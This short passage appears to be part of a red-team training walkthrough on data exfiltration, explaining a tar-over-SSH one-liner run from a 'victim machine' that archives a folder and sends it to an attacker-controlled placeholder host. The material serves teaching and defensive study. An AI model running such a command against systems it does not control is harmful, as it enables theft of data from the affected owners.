### SSH
from the victim machine:\
`tar cf - <folder> | ssh <RED>@<IP> "cd /tmp/; tar xpf -"`
1. We used the tar command the same as the previous task to create an archive file of the <folder> directory.\
2. Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session. \
3. We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.
